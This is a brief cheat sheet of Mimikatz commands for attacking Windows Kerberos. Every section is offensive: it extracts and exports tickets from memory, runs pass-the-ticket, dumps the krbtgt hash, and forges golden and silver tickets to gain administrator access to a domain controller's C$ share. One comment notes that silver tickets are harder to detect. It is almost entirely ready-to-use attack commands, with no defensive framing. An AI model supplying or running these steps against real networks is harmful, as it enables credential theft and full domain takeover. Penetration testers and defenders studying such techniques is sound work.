Extract Kerberos Ticket
# List all tickets
kerberos::list

# Export all tickets to disk
sekurlsa::tickets /export

# Export specific ticket
sekurlsa::tickets /export /user:Administrator

Pass The Ticket

# Load a ticket
kerberos::ptt C:\tickets\0-123456.kirbi

# List loaded tickets
kerberos::list

# Access resources using the ticket
dir \\DC.domain.local\C$

Golden Ticket Creation

# First, get domain SID and krbtgt hash
lsadump::lsa /inject /name:krbtgt
# Get: Domain: S-1-5-21-123456789-123456789-123456789
# Get: krbtgt NTLM hash

# Create golden ticket
kerberos::golden /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:KRBTGT_HASH /user:Administrator /ticket:golden.kirbi

# Alternative: create with specific group IDs
kerberos::golden /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:KRBTGT_HASH /user:EvilAdmin /group:512 /ticket:evil.kirbi

# Load and use
kerberos::ptt golden.kirbi
ls \\DC.domain.local\C$

Silver Ticket Creation

# Get service account hash (e.g., for CIFS service on specific machine)
# Silver tickets are less powerful but harder to detect

# Create silver ticket for CIFS service
kerberos::golden /domain:domain.local /sid:S-1-5-21-123456789-123456789-123456789 /target:TARGET.domain.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt

# Access the specific machine
dir \\TARGET.domain.local\C$